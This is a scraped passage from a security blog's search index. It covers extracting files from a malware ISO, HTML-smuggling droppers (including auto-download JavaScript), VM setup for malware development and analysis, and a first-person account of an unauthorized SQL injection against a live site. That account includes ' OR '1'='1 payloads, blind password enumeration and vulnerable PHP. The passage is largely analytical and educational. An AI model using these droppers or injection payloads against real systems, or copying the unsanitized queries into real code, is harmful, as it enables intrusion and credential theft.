<li><code>/DOCS/INSTALL.PS1</code></li> <li><code>/DOCS/STATEM~1.DOC</code></li> </ul> </li> </ul> </li> </ul> <p>We can also obtain a directory structure via the <code>iso.walk</code> method:</p> <pre><code>&gt;&gt;&gt; for dname, dlist, flist in iso.walk(iso_path=\"/\"):\n...     print(f\"{dname}: {dlist} {flist}\")\n... \n/: ['DOCS'] ['STATEM~1.LNK;1']\n/DOCS: [] ['STATEM~1.DOC;1', 'INSTALL.PS1;1']\n</code></pre> <p>We can gather information about specific files by their ISO path:</p> <pre><code>&gt;&gt;&gt; record = iso.get_record(iso_path=\"/DOCS/INSTALL.PS1;1\")\n&gt;&gt;&gt; record.is_file()\nTrue\n&gt;&gt;&gt; record.is_dir()\nFalse\n&gt;&gt;&gt; record.get_data_length()\n12836\n</code></pre> <p>When done working with the ISO, be sure to close it:</p> <pre><code>&gt;&gt;&gt; iso.close()\n</code></pre>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/ISOs/#via-fsarchive","title":"Via FS.Archive","text":"<p>We can also use the <code>fs.archive</code> library, another non-standard Python extension, which wraps around <code>pycdlib</code> to provide a simpler interface. To start, we'll need to install the package:</p> <pre><code>(iso.venv) analyst@lab_vm iso.venv % pip install fs.archive\nCollecting fs.archive\n[...]\nSuccessfully installed appdirs-1.4.4 fs-2.4.16 fs.archive-0.7.3\n</code></pre> <p>With the utility installed, we can open the ISO:</p> <pre><code>&gt;&gt;&gt; from fs import open_fs\n&gt;&gt;&gt; from fs.archive import open_archive\n&gt;&gt;&gt; root = open_fs(\"./\") # Path where the ISO is stored.\n&gt;&gt;&gt; archive = open_archive(root, \"documents.iso\")\n&gt;&gt;&gt; archive.isempty(path=\"/\")\nFalse\n</code></pre> <p>We can now explore the contents of the ISO:</p> <pre><code>&gt;&gt;&gt; for path, dirs, files in archive.walk():\n...     print(f\"{path}:\\n\\tDirs: {dirs}\\n\\tFiles: {files}\")\n... \n/:\n        Dirs: [&lt;dir 'docs'&gt;]\n        Files: [&lt;file 'statem~1.lnk'&gt;]\n/docs:\n        Dirs: []\n        Files: [&lt;file 'install.ps'&gt;, &lt;file 'statem~1.doc'&gt;]\n</code></pre> <p>We can now extract the contained files:</p> <pre><code>&gt;&gt;&gt; def save(path):\n...     fname = path.split(\"/\")[-1]\n...     f = archive.open(path=path)\n...     contents = f.buffer.readall()\n...     with open(fname, 'wb') as outfile:\n...         outfile.write(contents)\n...     f.close()\n... \n&gt;&gt;&gt; for path in [\n...     \"/statem~1.lnk\",\n...     \"/docs/install.ps\",\n...     \"/docs/statem~1.doc\"\n... ]:\n...     save(path)\n</code></pre> <p>After executing this code, we should have three new files in our working directory:</p> <pre><code>(iso.venv) analyst@lab_vm iso.venv % ls -l\ntotal 11656\ndrwxr-xr-x  8 analyst  staff      256 Dec 19 15:28 .\ndrwxr-xr-x@ 5 analyst  staff      160 Dec 19 15:28 ..\n-rw-r--r--@ 1 analyst  staff  1245184 Dec 19 13:40 documents.iso\n-rw-r--r--  1 analyst  staff    12836 Dec 19 15:25 install.ps\n-rw-r--r--@ 1 analyst  staff  1992525 Dec 13 16:01 statement.htm\n-rw-r--r--  1 analyst  staff     5467 Dec 19 15:25 statem~1.doc\n-rw-r--r--  1 analyst  staff     2357 Dec 19 15:25 statem~1.lnk\n-rw-r--r--  1 analyst  staff  2698674 Dec 13 15:45 suspicious.eml\n</code></pre> <p>The files are cleanly extracted, ready for further analysis!</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/21%20File%20Forensics/ISOs/#an-important-note","title":"An Important Note","text":"<p>The demonstrated methods do not preserve the files' original names. This is, in part, due to the way filenames are saved in ISO files and parsed by the referenced Python libraries. This does not directly represent what is observed when the ISO is opened on a host, but this could be seen as a benefit; malware distributed by ISO often employs tricks that are path-dependent, such as the LNK file in the sample, which calls the PS1 file by name. If the name is changed (such as <code>statement.doc.lnk</code> being compressed to <code>statem~1.lnk</code>), this can break the malware's functionality.</p> <p>To preserve filenames, you may want to use the dynamic methods, such as mounting the image, or extracting it with 7zip.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/22%20Language%20Tricks/HTML%20and%20JS/","title":"HTML and JavaScript","text":"HTML and JavaScript"},{"location":"ScriptSharks.com/0x20%20Analysis/22%20Language%20Tricks/HTML%20and%20JS/#embedded-file-downloads","title":"Embedded File Downloads","text":""},{"location":"ScriptSharks.com/0x20%20Analysis/22%20Language%20Tricks/HTML%20and%20JS/#overview","title":"Overview","text":"<p>HTML droppers often abuse embedded file downloads to imitate downloading a file from the internet. With this technique, arbitrary files can be embedded within an HTML document, then extracted via web browsers' built-in \"download\" functionality. This looks nigh-indistinguishable from typical downloads.</p> <p>There are a few benefits to this technique:</p> <ul> <li>It bypasses web content filters.<ul> <li>These filters block access to malicious sites, including malware-distribution sites.</li> <li>Users who are aware of these filters expect to be protected from malicious files.</li> <li>Embedded downloads can abuse this trust, reducing suspicion of embedded files.</li> </ul> </li> <li>It does not require a network connection.<ul> <li>Embedded files are fully contained within an HTML document.</li> <li>If the user has the HTML document, they can download the embedded file offline.</li> </ul> </li> <li>It can be disguised with ease.<ul> <li>The HTML dropper can imitate legitimate websites, web content filters, etc.</li> <li>This makes them especially useful when distributing malware via phishing emails.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0x20%20Analysis/22%20Language%20Tricks/HTML%20and%20JS/#examples","title":"Examples","text":"<p>Embedded files can appear as a simple HTML hyperlink tag:</p> <pre><code>&lt;a href=\"data:application/octet-stream;base64,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\"\n    target=\"_self\" download=\"documents.iso\"&gt;\n    Download this file\n&lt;/a&gt;\n</code></pre> <p>In this instance, the <code>documents.iso</code> file is embedded as a base64-encoded link in the <code>href</code> attribute of the hyperlink. When the user clicks the \"Download this file\" link, the download is initiated.</p> <p>Rather than depending on users to click hyperlinks, embedded files can also be served via JavaScript, set to download as soon as the page has loaded:</p> <pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;script&gt;\n            const filename = \"documents.iso\";\n            const contentBase64 = (\n                 \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n                +\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n                +\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n                // [and so on]\n            );\n            function trigger(){\n                var element = document.createElement(\"a\");\n                element.setAttribute(\"href\", `data:application/octet-stream;base64,${contentBase64}`);\n                element.setAttribute(\"target\", \"_self\");\n                element.setAttribute(\"download\", filename);\n                element.style.display = \"none\";\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n            }\n        &lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body onload=\"trigger()\"&gt;\n        (html body)\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>In the above example, the <code>trigger</code> function is called when the page finishes loading, thanks to the <code>onload</code> attribute of the <code>body</code> tag. The <code>trigger</code> function adds a new HTML hyperlink tag to the page, formatted just like the one from the previous example, except the hyperlink is hidden from view. Once created, the script automatically clicks the link (via <code>element.click()</code>), triggering the download. Finally, it removes the hyperlink tag from the page.</p>"},{"location":"ScriptSharks.com/0x20%20Analysis/22%20Language%20Tricks/HTML%20and%20JS/#extracting-embedded-files","title":"Extracting Embedded Files","text":"<p>There are two ways to extract embedded files from HTML documents. The first method is simple: Open the HTML document and accept the download. This has its risks, of course, as you'll be executing whatever JavaScript code is also embedded in the HTML, but if you're working in a properly-maintained and isolated VM, most risks should be mitigated.</p> <p>The more complicated (yet safer) method is to open the HTML file, rip out the section containing the embedded file, and re-assemble it manually. In the above examples, extracting and decoding the Base64-encoded payload should be fairly straightforward. In the case of the simple hyperlink, one could open the HTML file, find the beginning of the Base64 block, and cut everything before it. Then, they could jump to the end of the document, scroll back until they find the end of the Base64 block, and cut everything after it. This would produce a single, isolated block of Base64 containing the embedded file.</p> <p>Extracting the embedded file from the more advanced JavaScript version is a little more tricky. The Base64 is split across nearly 22 thousand individual lines; to perform the extraction by hand would be excruciating, with a significant risk of human error.</p> <p>Fortunately, we don't have to do everything by hand. We'll use Python to extract the embedded file. First, we'll open the file:</p> <pre><code>&gt;&gt;&gt; with open(\"statement.htm\",\"r\") as infile:\n...     # Omit empty lines and strip surrounding whitespace.\n...     contents = [line.strip() for line in infile.readlines() if line.strip()]\n... \n&gt;&gt;&gt; len(contents)\n21988\n</code></pre> <p>As stated, the file has nearly 22 thousand lines. Looking at the code, we can see that the Base64 is split into chunks, each on its own line, surrounded with quotes, with an optional addition symbol (<code>+</code>) at the front. To identify these lines, we'll build a regex:</p> <pre><code>&gt;&gt;&gt; import re\n&gt;&gt;&gt; lines = []\n&gt;&gt;&gt; for line in contents:\n...     try:\n...         match = re.search('\\\\+?\"([A-Za-z0-9\\\\+/=]+)\"', line).group(1)\n...         lines.append(match)\n...     except AttributeError:\n...         pass\n... \n&gt;&gt;&gt; len(lines)\n21857\n&gt;&gt;&gt; lines[0]\n'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n</code></pre> <p>We've successfully extracted the Base64 lines from the HTML file. Let's reassemble the lines into a single block:</p> <pre><code>&gt;&gt;&gt; payload = \"\".join(lines)\n&gt;&gt;&gt; len(payload)\n1660296\n&gt;&gt;&gt; payload[:20]\n'AAAAAAAAAAAAAAAAAAAA'\n</code></pre> <p>Having reassembled the Base64-encoded payload into a string, we can now decode it, then write it to a file:</p> <pre><code>&gt;&gt;&gt; from base64 import b64decode\n&gt;&gt;&gt; decoded = b64decode(payload)\n&gt;&gt;&gt; decoded[:20]\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n&gt;&gt;&gt; with open(\"documents.iso\",\"wb\") as outfile:\n...     outfile.write(decoded)\n... \n1245184\n</code></pre> <p>Excellent! We have successfully extracted the embedded file from the HTML dropper.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/00%20Background/","title":"Back in My Day...","text":"<p>Used to be, if you wanted to try out a new OS, you'd have to install it on \"bare metal.\" If you didn't have a spare PC, you'd wipe your old OS to try the new one. And if you didn't like the new OS? You'd re-install the old one, and have to re-install all your apps, re-configure all your settings... What a hassle.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/00%20Background/#jeckyll-and-hyde","title":"Jeckyll and Hyde","text":"<p>Some systems could \"multi-boot,\" allowing for multiple OSes on a single machine. This was great for people who wanted to explore new OSes without losing their dependable OS, or for people who needed to use tools available on different OSes. There were still some problems:</p> <ul> <li>Only one OS could run at a time.</li> <li>Every OS had access to every other OS; if malware ran in one OS, it could infect all the rest.</li> </ul>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/00%20Background/#were-doing-it-live","title":"We're Doing It Live","text":"<p>The Live CD was revolutionary, allowing OSes to be run from read-only CD drives without the need for installation. The first few were pretty niche, but systems like Knoppix and Slax changed the game, providing a full-featured Linux OS on a Live CD. One notable example was BackTrack, a Linux Live CD designed for penetration testing. In 2013, Offensive Security rebased BackTrack on Debian instead of Ubuntu, and changed its name to Kali Linux. Kali has become the de-facto standard for the industry.</p> <p>Live CDs made for great recovery OSes, and could even be configured to provide anonymity and privacy. But they still had some problems:</p> <ul> <li>They were read-only, so you couldn't install anything permanently without a secondary storage medium.</li> <li>They were slow, because they had to read from the CD drive.</li> </ul> <p>These days, people are more likely to use a Live USB drive than a Live CD, but they work in basically the same way.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/00%20Background/#yo-dawg-i-herd-you-like-computers","title":"Yo Dawg, I Herd You Like Computers","text":"<p>As computers got faster, it became possible to run multiple OSes simultaneously, through a process called virtualization. In this process, a single \"host\" OS runs a \"hypervisor\" that manages one or more \"guest\" OSes. The guest OSes are isolated from each other, and from the host OS. This allows for a lot of flexibility; for example, if you want to analyze a malware sample safely, you could spin up a temporary Windows VM in an isolated network, ensuring that it cannot spread to other systems, while simultaneously taking analysis notes on the host OS or a separate VM.</p> <p>VMs offer many advantages over Live CDs, such as:</p> <ul> <li>Multiple OSes can be run simultaneously on a single host.</li> <li>Systems can quickly and easily be restored to a known good state.</li> <li>VMs are isolated from the host and from each other.</li> <li>Multiple virtualized networks can be configured between guests on a single machine.</li> <li>VMs can be cloned and moved between machines.</li> <li>VMs can be run on cloud services, reducing the need for expensive local hardware and complicated upkeep.</li> </ul>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/00%20Background/#which-is-best","title":"Which is Best?","text":"<p>For the purposes of malware design and analysis, we advise the use of VMs over Live CDs/USBs, dual-booting, and full-disk installs, as they offer the most flexibility and control. However, there are some reasons and situations for which Live CDs/USBs are preferable:</p> <ul> <li>Some systems, such as macOS, cannot easily be virtualized.</li> <li>Live CDs/USBs are better-suited for forensic analysis of physical hardware, such as infected hard drives.</li> <li>Some specialized hardware cannot easily be eulated or passed through to a VM.</li> </ul>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/01%20Hypervisors/","title":"Introduction","text":"<p>Hypervisors are generally broken down into two categories: Type 1 and Type 2. Type 1 hypervisors run directly on the hardware, while Type 2 hypervisors run on top of an existing OS. Type 1 hypervisors are generally more efficient, but Type 2 hypervisors are more flexible.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/01%20Hypervisors/#type-1-hypervisors","title":"Type 1 Hypervisors","text":"<p>For those with the extra hardware, Type 1 hypervisors are the way to go. They run on \"bare metal,\" and are generally more efficient than Type 2 hypervisors. They also offer more control over the hardware, and can be configured to pass through hardware to the guest OSes. This allows for the use of specialized hardware, such as GPUs, sound cards, and USB devices, in the guest OSes. The following are some of the most popular Type 1 hypervisors:</p> <ul> <li>VMware ESXi<ul> <li>ESXi is a bare-metal hypervisor that runs on top of a custom kernel.</li> <li>Running a single server is fairly straightforward, but clustering requires commercial licensing.</li> </ul> </li> <li>Microsoft Hyper-V<ul> <li>Hyper-V runs atop 64-bit versions of Microsoft Windows, including Windows Server, as well as Windows 10 Pro, Enterprise and Education.</li> <li>The functionality depends on the host OS, with some features only available in the server version, and others only in the desktop version.</li> </ul> </li> <li>Proxmox VE<ul> <li>Proxmox VE is a Debian-based hypervisor that uses KVM for virtualization.</li> <li>The core is open-source and free, though a commercial subscription is available for additional features.</li> </ul> </li> </ul> <p>Personally, I've used a free single-host ESXi installation on a dedicated workstation for my home lab, and it's worked great.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/01%20Hypervisors/#type-2-hypervisors","title":"Type 2 Hypervisors","text":"<p>The two most popular Type 2 hypervisors are VirtualBox and VMware Workstation. Both are free, and both are available for Windows, Linux, and macOS. The main difference between the two is that VirtualBox is open-source, while VMware Workstation is proprietary. VirtualBox is also more flexible, as it can run on top of any OS, while VMware Workstation requires Windows or Linux. For macOS, VMware Fusion is available, which provides similar functionality to VMware Workstation. However, it will not run on newer Apple Silicon hardware, such as the M1 and M2 chipsets.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/01%20Hypervisors/#which-hypervisor-should-i-use","title":"Which Hypervisor Should I Use?","text":"<p>If you're working solo, then a Type 2 hypervisor like VMware or VirtualBox will allow you to use VMs on your local machine. If you're working in a team, then a Type 1 hypervisor like ESXi or Hyper-V will enable you to run VMs on a dedicated server, and share them with the rest of the team.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/01%20Hypervisors/#apple-silicon","title":"Apple Silicon","text":"<p>For those using modern macOS hardware with Apple Silicon, VirtualBox is the only available option, and only as a developer preview. In addition, it only really supports ARM-based OSes, which means if you're analyzing malware written for x86, you're out of luck. My advice, for those who can afford it, is to use <code>ESXi</code> on a dedicated workstation, and access the VMs using the VMware Remote Console. This will allow you to access x86/x64 VMs from your Apple Silicon Mac.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/02%20Guest%20OSes/","title":"The Tyranny of Choice","text":"<p>When it comes to guest OSes, there are a lot of options. However, for the purposes of malware development and analysis, you'll want (at a minimum) a Windows and a Linux guest VM; preferably more than one of each.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/02%20Guest%20OSes/#malware-development","title":"Malware Development","text":"<p>For creating malware, you'll want a fully-featured development environment, with support for multiple programming languages and a solid IDE. Thankfully, there are some excellent pre-made solutions for this purpose:</p> <ul> <li>Windows 11 Development Environment<ul> <li>A fully-featured development environment for Windows 11, including Visual Studio 2022 and a full suite of tools and languages.</li> <li>This VM is huge, but comes with everything you need to get started with Windows development.</li> <li>The VM expires after 90 days, but can be re-downloaded.</li> </ul> </li> <li>Pop!_OS<ul> <li>A Linux distribution based on Ubuntu, aimed at software developers.</li> <li>Well-suited for a variety of languages, including C, C++, Python, and Go.</li> </ul> </li> <li>Kali Linux<ul> <li>A Linux distribution based on Debian, aimed at penetration testers.</li> <li>Includes tools for generating shellcode and other malware payloads.</li> </ul> </li> <li>Parrot Security OS<ul> <li>A Linux distribution based on Debian, aimed at penetration testers and security professionals.</li> <li>Includes custom-tailored editions for developers, penetration testers, and more.</li> </ul> </li> </ul> <p>At a minimum, you'll want at least one Windows development VM and one Linux VM, with the ability to create shellcodes and other malware implants. For this purpose, <code>Parrot OS</code> is a solid choice, though <code>Kali</code> and <code>Pop!</code> are also good options.</p>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/30%20Virtual%20Machines/02%20Guest%20OSes/#malware-analysis","title":"Malware Analysis","text":"<p>For running and analyzing malware, you'll want a separate VM from your development systems. This is to prevent any accidental damage to your development environment, and to ensure that your malware analysis environment is as clean as possible. For this purpose, you'll want a VM that is as close to a \"vanilla\" installation as possible, with few modifications. This will help ensure that any changes to the system are caused by the malware, and not by the analyst. The following are some excellent options for analysis guest VMs:</p> <ul> <li>Windows Testing VMs<ul> <li>A collection of Windows VMs, including Windows 7, Windows 8.1, and Windows 10, with Internet Explorer or Edge browsers pre-installed.</li> <li>These VMs contain very little additional software, and are very close to a \"vanilla\" installation.</li> <li>They expire after 90 days, but can be re-activated or rolled back to a clean, \"un-registered\" state.</li> <li>For testing on Windows 11, it may be necessary to use the Windows 11 Development Environment VM, as the Windows 11 Testing VMs are not yet available.</li> </ul> </li> <li>Remnux<ul> <li>An open-source and free Linux-based toolkit specifically designed for malware analysts.</li> <li>Contains an extensive suite of malware analysis and reverse-engineering tools.</li> </ul> </li> <li>Flare VM<ul> <li>While technically not a full VM in its own right (due to Windows license restrictions), Flare VM is a set of scripts that install and configure a full suite of analysis and reversing tools for Windows.</li> <li>This is a great option for analysts who already have a Windows VM, but want to add a full suite of analysis tools.</li> <li>Alternatively, one could download and install each tool individually, but this is a time-consuming process.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/31%20File%20Manipulation/Metadata/","title":"Parsing File Metadata","text":"Parsing File Metadata"},{"location":"ScriptSharks.com/0x30%20Tools%20of%20the%20Trade/31%20File%20Manipulation/Metadata/#the-file-utility","title":"The <code>file</code> Utility","text":"<p>On Unix-like systems (e.g. macOS, Linux, BSD), the <code>file</code> utility can determine file types by examining their metadata:</p> <pre><code>(iso.venv) analyst@lab_vm iso.venv % file statem~1.doc \nstatem~1.doc: Microsoft Word 2007+\n(iso.venv) analyst@lab_vm iso.venv % file statem~1.lnk \nstatem~1.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has command line arguments, Icon number=0, Archive, ctime=Fri Apr  9 19:50:46 2021, mtime=Wed Oct  5 04:38:35 2022, atime=Fri Apr  9 19:50:46 2021, length=452608, window=hidenormalshowminimized\n(iso.venv) analyst@lab_vm iso.venv % file install.ps\ninstall.ps: ASCII text, with very long lines (12834), with CRLF line terminators\n</code></pre> <p>This is especially useful when trying to identify files for which the original filenames have been lost, or whose filenames have been intentionally obfuscated.</p> <p>Windows users can use a Windows-specific port of the <code>file</code> utility, or use the Cygwin bundle, in which the <code>file</code> utility is bundled.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FC%20Old%20News/","title":"Old News","text":"Old News"},{"location":"ScriptSharks.com/0xF0%20About/FC%20Old%20News/#20220823","title":"2022.08.23","text":"<p>After considerable reader feedback, We've finally added the ScriptSharks.com Origin Story. Check it out to learn about the site's history!</p>"},{"location":"ScriptSharks.com/0xF0%20About/FC%20Old%20News/#20220809","title":"2022.08.09","text":"<p>The Malware History project continues with our exploration of the 90s and the escalation of the digital arms race!</p>"},{"location":"ScriptSharks.com/0xF0%20About/FC%20Old%20News/#20220511","title":"2022.05.11","text":"<p>After exploring malware's early days, witness the malware explosion of the 80s in the latest Malware History section!</p>"},{"location":"ScriptSharks.com/0xF0%20About/FC%20Old%20News/#20220505","title":"2022.05.05","text":"<p>We've established the Malware History section, starting with history's earliest malware. Stay tuned for more!</p>"},{"location":"ScriptSharks.com/0xF0%20About/FC%20Old%20News/#20220430","title":"2022.04.30","text":"<p>Today marks the rebirth of ScriptSharks.com! Like a phoenix rising from ashes, except wet, and huge, and with so many teeth...</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/","title":"ScriptSharks Origins","text":"ScriptSharks Origins <p>Disclaimer: This story is told from memory. I expect there will be inaccuracies. Where appropriate, I've invented code or console transcripts that attempt to represent data lost to time. I've recreated them as accurately as I can. I aim to tell the truth of my experience, though I cannot guarantee the veracity of every detail.</p> <p>Grab a drink, pull up a seat, and I'll tell you the story behind ScriptSharks.com. I never knew the domain's original owner personally, but he (and his website) changed my life... Though, not in the way one might expect.</p> <p>Read on, and you'll understand.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#prologue","title":"Prologue","text":"<p>Back in 2001, I was a punk-ass wannabe hacker in high school. I'd been writing software for about six years, and after watching a PBS Frontline Documentary on hackers, I became obsessed with the subject. I collected every scrap of data I could find, from low-bar \"script kiddie\" hack-tools to sophisticated exploitation whitepapers. I read books and 'zines (like 2600 and PHRACK), watched videos, and infected my parents' PC with more malware than I care to admit. I learned about hacker history back to the '60s, about their culture and communities, and about famous groups like the Masters of Deception and the Legion of Doom (of the alleged \"Great Hacker War\"). I was insatiable.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#attack","title":"Attack","text":""},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#preparation","title":"Preparation","text":"<p>(MITRE: T1593.002)</p> <p>In 2003, after learning about SQL Injection (SQLi), I was eager to practice what I'd learned. Back then, we didn't have sites like HackTheBox providing practice labs. Even HackThisSite was new, and was not well-known. Hackers had two choices: either get legal access to test hardware, or practice your skills \"in the wild.\"</p> <p>I was too broke to afford my own computer, let alone to buy a spare PC for \"target practice,\" and I didn't know any other hackers IRL. I decided to take the risk and practice on live targets. (As a kid, rational thinking and sound judgment were not my strong suits.)</p> <p>I used my Google-fu to search for vulnerable websites. I did a basic <code>inurl:login.php</code> search, and among the results, I found a link to scriptsharks.com. On visiting the site, I was excited to see that it was a site for programmers, including guides for PHP (which I was learning at the time). I decided to learn more about the site and its owner.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#reconnaissance","title":"Reconnaissance","text":"<p>(MITRE: T1589, T1592.002, T1594, T1595)</p> <p>In 2000, Stephen \"Gabriel\" Lane (a.k.a. \"Calico Jack\")\u2014a motorcycle enthusiast and Senior Software Engineer for the New Orleans Saints\u2014created ScriptSharks.com as a place \"designed by a programmer for programmers,\" where he could share tutorials, manage code projects, and provide other resources for programmers. He was fluent in numerous programming languages, and provided the full source code for dozens of programs he'd written, all for free.</p> <p>When I first started programming, back in 1995, I didn't have the Internet, and it was hard to find resources from which to learn. So I appreciated when successful people like Stephen shared their code and experience with the community. It seemed like he was living my dream, and he wasn't much older than me.</p> <p>From his website, I knew that Stephen used the Linux operating system, and designed websites using PHP, hosted with Apache and MySQL. (A typical LAMP stack.) I scanned the server's ports; <code>22</code> and <code>80</code> were open, but not much else. These ports were provided by OpenSSH and Apache, each fully up-to-date and patched.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#initial-access","title":"Initial Access","text":"<p>Curiosity killed the cat. I'm glad I'm not a cat.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#vuln-discovery","title":"Vuln Discovery","text":"<p>(MITRE: T1588.006)</p> <p>After learning about Stephen and his technical knowledge, I was excited to explore the guides and source code provided on his site. My first stop was his guide to designing Sessions and Authentication Systems in PHP. My original goal was to practice SQLi attacks; it seemed likely that his site's auth code would be similar to that in his guide, which included SQL table layouts and code samples. If there was a vulnerability to be found, this was a good place to start hunting.</p> <p>Here's the session-checking code from Stephen's guide:</p> <pre><code>function is_logged_in() {\n    global $session_id;\n    $select = \"SELECT Logged_In FROM Sessions WHERE Session_ID = '$session_id'\";\n    $result = mysql_db_query(\"Your DB\", $select) or die (mysql_error() . \"&lt;HR&gt;\\n$select\");\n    $db = mysql_fetch_array($result);\n    return $db[Logged_In];\n}\n</code></pre> <p>And here's the logout code:</p> <pre><code>session_start();\n$session_id = session_id();\n$insert = \"UPDATE Sessions SET Logged_In = '0' WHERE Session_ID = '$session_id'\";\n$result = mysql_db_query(\"Your DB\", $insert) or die(mysql_error() . \"&lt;hr /&gt;\\n\" . $insert);\n</code></pre> <p>On reading the code, I realized the <code>SELECT</code> query was not being sanitized in the <code>is_logged_in</code> function, nor was the <code>UPDATE</code> query in the logout code. Theoretically, someone could de-authenticate any user they wished, or authenticate as any user, as long as they had some way to control the contents of the <code>$session_id</code> variable.</p> <p>Stephen had failed to sanitize database inputs in his guide; perhaps the same would be true of his login page?</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#vuln-confirmation","title":"Vuln Confirmation","text":"<p>(MITRE: T1190)</p> <p>I decided to test the login for SQLi vulnerabilities. If the <code>login.php</code> script were written similar to the code from his tutorial, the code would likely include a SQL query something like this:</p> <pre><code>$select = \"SELECT * FROM Users WHERE Username = '$username' AND Password = '$password' LIMIT 1\";\n</code></pre> <p>When called on the database, the <code>$username</code> and <code>$password</code> variables would be substituted for user-provided values. If I entered <code>' OR '1'='1</code> as both the username and password, the query would return the first user in the database. In most cases, the first user in the database is an admin.</p> <p>I did not actually expect my attack to work. Stephen's tutorial was intended to be basic, for the sake of learning. Considering the experience listed on his resum\u00e9, I expected the <code>$username</code> and <code>$password</code> variables to be sanitized before being passed to the database. So I was legitimately surprised when, upon executing my SQLi attack, I was successfully authenticated as the admin user, <code>sglane</code>.</p> <p>\"Holy crap,\" I thought. \"I got in!\" It was an incredible rush. I was simultaneously thrilled that my attack had worked, and terrified that I was going to get caught and arrested under the CFAA over a silly SQLi attack. (Funny how consequences only came to mind after I'd done the attack.)</p> <p>I hadn't caused any harm, though; and besides, this was Stephen's personal page, not attached to some hyper-litigious corporation. No harm, no foul, right?</p> <p>My excitement outweighed my fear. I decided to press further. By altering my query, I could skip the <code>sglane</code> user and authenticate as the second user in the database:</p> <ul> <li>Username: <code>' OR '1'='1</code></li> <li>Password: <code>' OR '1'='1' AND Username != 'sglane</code></li> </ul> <p>Executing the attack, I was successfully authenticated as the second user in the database. From there it was a simple matter to enumerate all the users, one by one, simply adding a new <code>Username != 'blah'</code> clause to the query for each discovered user.</p> <p>Not bad for my first real-world attempt at SQLi!</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#account-compromise","title":"Account Compromise","text":"<p>(MITRE: T1212, T1552, T1586)</p> <p>I was quite pleased with my accomplishment, but I was not done yet. What good are usernames without passwords? I searched around, unable to find an obvious way to retrieve the password from the database. I decided to try \"blind\" injection, enumerating the password character-by-character:</p> <ul> <li>Username: <code>sglane</code></li> <li>Password: <code>' OR Password LIKE 'a%</code></li> </ul> <p>If the password started with <code>a</code>, I'd be authenticated. Otherwise, I'd be returned to the login screen, where I'd check every subsequent character until I found a match. Then I could start on the 2nd character, and so on. Once I'd uncovered the first password, I could move on to the second username, and repeat the process. Without automation, this process could take ages, but I was young and optimistic, and people didn't often use random 20-character passwords back then.</p> <p>Imagine my surprise when I found the complete password on the first attempt.</p> <p>After sending my injected credentials, the site rejected my attempt and returned me to the login page. However, I noticed that the login form had been re-populated upon my return, rather than preseting me with empty fields. \"Curious,\" I thought. \"What values are in the form fields?\"</p> <p>Viewing the page source code, I was appalled to discover that the login script, while refusing my attempt, had actually filled in the correct password for the specified user, taken straight out of the database. The password was right there, in clear-text, in the HTML of the page.</p> <p>It appeared that Stephen had intended the script to re-populate the form fields with the user's original input upon returning to the login page, like so:</p> <pre><code>&lt;?php\n$username = $_POST['username'];\n$password = $_POST['password'];\n$query = \"SELECT Username, Password FROM Users WHERE Username = '$username' AND Password = '$password' LIMIT 1\";\n$result = mysql_db_query(\"Your DB\", $query) or die(mysql_error() . \"&lt;hr /&gt;\\n\" . $query);\n$values = mysql_fetch_array($result);\nif($values['Username'] == $username &amp;&amp; $values['Password'] == $password) {\n    /* Redirect the user to the projects page. */\n    header(\"Location: projects.php\");\n    